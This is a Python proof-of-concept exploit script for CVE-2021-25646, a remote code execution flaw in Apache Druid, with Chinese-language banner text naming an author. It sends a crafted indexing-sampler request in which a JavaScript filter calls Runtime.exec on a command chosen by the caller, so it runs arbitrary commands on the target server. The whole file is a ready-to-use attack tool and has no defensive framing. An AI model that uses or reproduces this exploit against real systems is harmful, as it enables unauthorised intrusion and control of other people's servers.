import json
import re
import sys
import requests



def title():
    print("[-------------------------------------------------------------]")
    print("[--------------      Druid 代码执行      ---------------]")
    print("[--------               CVE-2021-25646            ----------]")
    print("[--------    use:python3 CVE-2021-25646.py url cmd --------]")
    print("[--------              Author:鸣蜩十四           ------------]")
    print("[-------------------------------------------------------------]")

def main(url,cmd) :
    if (len(sys.argv)==3):
        poc(url,cmd)
    else :
        print("Example: \n   python3 " + sys.argv[0] + " url" + " cmd" + "\n")

def poc(url,cmd) :
    url = str(url) + "/druid/indexer/v1/sampler"
    headers={
    "Accept": "application/json,text/plain, */*",
    "Content-Type": "application/json"
    }
    payload = {
        "type":"index","spec":{"type":"index","ioConfig":{"type":"index","firehose":{"type":"local","baseDir":"quickstart/tutorial/","filter":"wikiticker-2015-09-12-sampled.json.gz"}},"dataSchema":{"dataSource":"sample","parser":{"type":"string","parseSpec":{"format":"json","timestampSpec":{"column":"time","format":"iso"},"dimensionsSpec":{}}},"transformSpec":{"transforms":[],"filter":{"type":"javascript",
"function":"function(value){return java.lang.Runtime.getRuntime().exec('"+cmd +"')}",
"dimension":"added",
"":{
"enabled":"true"
}
}}}},"samplerConfig":{"numRows":500,"timeoutMs":15000,"cacheKey":"4ddb48fdbad7406084e37a1b80100214"}
    }
    proxies = {
        "http":"http://127.0.0.1:8081"

    }
    a = requests.post(headers=headers,url=url,data=json.dumps(payload),timeout=30)
    print("请检验结果")



if __name__ == "__main__" :
    title()
    url = sys.argv[1]
    cmd = sys.argv[2]
    main(url,cmd)
